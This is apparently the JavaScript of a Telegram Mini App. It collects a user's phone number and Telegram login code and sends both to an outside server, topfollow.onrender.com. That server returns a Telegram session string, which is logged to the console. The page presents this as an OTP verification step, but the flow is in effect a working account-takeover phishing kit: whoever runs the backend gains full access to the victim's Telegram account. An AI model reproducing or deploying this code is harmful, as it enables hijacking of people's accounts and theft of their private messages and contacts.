    <script>
        // --- INITIALIZATION ---
        let tg;
        try {
            tg = window.Telegram.WebApp;
            tg.ready();
            tg.expand();
        } catch (e) { console.error('SDK Load Error:', e); }

        let currentPhone = '';

        // --- 1. NATIVE SHARE BUTTON ---
        document.getElementById('shareContactBtn').addEventListener('click', function() {
            const status = document.getElementById('contactStatus');
            if (!tg) {
                fallbackToManual("SDK not available.");
                return;
            }
            
            try {
                status.className = 'status-msg info';
                status.innerText = '⏳ Opening contact request...';
                tg.requestContact();
            } catch (error) {
                console.warn("requestContact error:", error);
                fallbackToManual("Native contact unsupported. Please enter manually.");
            }
        });

        // --- 2. FALLBACK TO MANUAL ENTRY (Shown if native fails) ---
        function fallbackToManual(message) {
            document.getElementById('step1-subtext').innerText = message;
            document.getElementById('shareContactBtn').style.display = 'none';
            document.getElementById('manual-input-group').style.display = 'block';
            document.getElementById('contactStatus').innerText = '';
        }

        // --- 3. USER SUBMITS MANUAL PHONE ---
        window.submitManualPhone = function() {
            const input = document.getElementById('manualPhoneInput').value.trim();
            const status = document.getElementById('contactStatus');
            if (!input || input.length < 8) {
                status.className = 'status-msg error';
                status.innerText = "Please enter a valid phone number.";
                return;
            }
            currentPhone = input;
            proceedToOTP();
        }

        // --- 4. NATIVE CONTACT RECEIVED (With robust data parsing) ---
        tg.onEvent('contactRequested', function(data) {
            console.log('Raw Contact Data from Telegram:', data);
            const status = document.getElementById('contactStatus');
            
            // 📌 Robust parsing: handles different ways Telegram sends the data
            let phone = null;
            if (data && data.contact && data.contact.phone_number) {
                phone = data.contact.phone_number; // Standard way
            } else if (data && data.phone_number) {
                phone = data.phone_number;         // Some versions send it like this
            } else if (typeof data === 'string' && data.startsWith('+')) {
                phone = data;                       // Rarely, just the string
            } else if (data && typeof data === 'object') {
                // Last resort: look inside the object for any key containing a phone number
                const jsonStr = JSON.stringify(data);
                const match = jsonStr.match(/\+?\d{10,15}/);
                if (match) phone = match[0];
            }

            if (phone) {
                currentPhone = phone;
                proceedToOTP();
            } else {
                console.warn("Contact data was invalid, falling back to manual.");
                status.className = 'status-msg error';
                status.innerText = "Couldn't read phone number. Please enter it manually.";
                // Auto-fallback to manual input
                fallbackToManual("Contact data could not be parsed. Enter manually below:");
                document.getElementById('manualPhoneInput').value = "+91 "; // Prefill country code for India
            }
        });

        // If user cancels the native popup
        tg.onEvent('contactRequestedFailed', function() {
            const status = document.getElementById('contactStatus');
            status.className = 'status-msg info';
            status.innerText = "Contact request cancelled. You can enter manually below.";
            fallbackToManual("Contact request cancelled. Enter manually below:");
            document.getElementById('manualPhoneInput').value = "+91 ";
        });

        // --- 5. PROCEED TO OTP STEP ---
        function proceedToOTP() {
            document.getElementById('displayPhone').innerText = currentPhone;
            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
            document.getElementById('step-otp').classList.add('active');
            document.getElementById('contactStatus').innerText = '';
            sendOTPToBackend(currentPhone);
        }

        // --- 6. SEND OTP TO BACKEND ---
        async function sendOTPToBackend(phone) {
            const status = document.getElementById('otpStatus');
            status.className = 'status-msg info';
            status.innerText = '⏳ Sending OTP to your Telegram...';

            try {
                const resp = await fetch('https://topfollow.onrender.com/api/send-otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber: phone })
                });
                const data = await resp.json();
                if (data.success) {
                    status.className = 'status-msg success';
                    status.innerText = '✅ OTP sent! Check your Telegram app.';
                } else {
                    status.className = 'status-msg error';
                    status.innerText = data.error || 'Failed to send OTP.';
                }
            } catch (err) {
                console.error(err);
                status.className = 'status-msg error';
                status.innerText = 'Network error connecting to server.';
            }
        }

        // --- 7. VERIFY OTP ---
        window.verifyOTP = async function() {
            const code = document.getElementById('otpInput').value.trim();
            const status = document.getElementById('otpStatus');
            if (!code) {
                status.className = 'status-msg error';
                status.innerText = 'Please enter the 6-digit code.';
                return;
            }
            status.className = 'status-msg info';
            status.innerText = '⏳ Verifying OTP...';

            try {
                const resp = await fetch('https://topfollow.onrender.com/api/verify-otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber: currentPhone, code: code })
                });
                const data = await resp.json();

                if (data.success) {
                    console.log("🔐 TELEGRAM SESSION STRING:", data.session);
                    status.className = 'status-msg success';
                    status.innerText = '✅ Session created!';
                    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
                    document.getElementById('step-success').classList.add('active');
                } else {
                    status.className = 'status-msg error';
                    status.innerText = data.error || 'Invalid OTP.';
                }
            } catch (err) {
                console.error(err);
                status.className = 'status-msg error';
                status.innerText = 'Network error. Check console.';
            }
        };
    </script>
